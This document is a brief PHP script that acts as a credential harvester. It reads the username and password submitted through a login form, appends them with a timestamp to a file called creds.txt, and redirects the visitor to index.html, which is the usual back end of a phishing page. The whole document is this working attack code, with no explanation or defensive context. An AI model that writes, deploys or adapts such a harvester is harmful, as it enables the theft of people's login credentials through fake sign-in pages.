<?php
date_default_timezone_set("UTC");

$data = "Time: " . date("Y-m-d H:i:s") . " | User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n";

file_put_contents("creds.txt", $data, FILE_APPEND);

header("Location: index.html");
exit();
?>

